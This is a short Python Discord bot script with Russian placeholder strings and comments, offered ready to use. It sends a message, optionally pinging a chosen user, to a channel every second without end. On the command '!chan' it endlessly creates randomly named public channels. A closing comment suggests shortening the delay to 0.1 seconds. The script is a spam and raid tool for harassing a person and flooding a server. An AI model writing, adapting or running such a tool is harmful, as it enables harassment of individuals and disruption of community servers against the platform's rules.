import discord
import asyncio
import random
import string

TOKEN = "сюда токен бота"

CHANNEL_ID = "айди канала куда кидать сообщение"

MESSAGE = "текст сообщения, чтобы был пинг чела надо <@айдичела> в начале сообщения"

intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"Logged in as {client.user} (ID: {client.user.id})")
    print("------")
    channel = client.get_channel(int(CHANNEL_ID))
    while True:
        await channel.send(MESSAGE)
        await asyncio.sleep(1)

@client.event
async def on_message(message):
    if message.content.startswith("!chan"):
         while True:
            name = ''.join(random.choices(string.digits, k=6))
            guild = message.guild
            new_channel = await guild.create_text_channel(name)
            await new_channel.set_permissions(guild.default_role, read_messages=True, send_messages=True)
            await asyncio.sleep(1)

client.run(TOKEN)

#каналы создавать будет при вводе !chan
#сли 1 секунды много то измени задержку в await asyncio.sleep(1) на await asyncio.sleep(0.1)
